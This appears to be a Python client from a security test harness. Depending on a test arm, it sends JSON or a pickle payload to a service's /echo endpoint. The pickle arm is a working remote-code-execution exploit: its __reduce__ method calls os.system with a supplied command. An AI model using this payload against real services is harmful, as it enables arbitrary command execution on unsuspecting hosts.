"""Unauthenticated remote client on the internal network. Sends inputs/<arm> to the service."""
import json
import os
import pickle
import sys
import urllib.request

arm, nonce, host = sys.argv[1], sys.argv[2], sys.argv[3]
spec = json.loads(open(f"/case/inputs/{arm}.json", encoding="utf-8").read().replace("{{NONCE}}", nonce))


class Payload:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


if spec["body"] == "pickle-exec":
    body = pickle.dumps(Payload(spec["command"]))
else:
    body = json.dumps(spec["json"]).encode()
req = urllib.request.Request(f"http://{host}:3000/echo", data=body, method="POST",
                             headers={"Content-Type": spec["content_type"]})
try:
    with urllib.request.urlopen(req, timeout=30) as r:
        print(r.status, r.read()[:200])
except urllib.error.HTTPError as e:
    print(e.code, e.read()[:200])
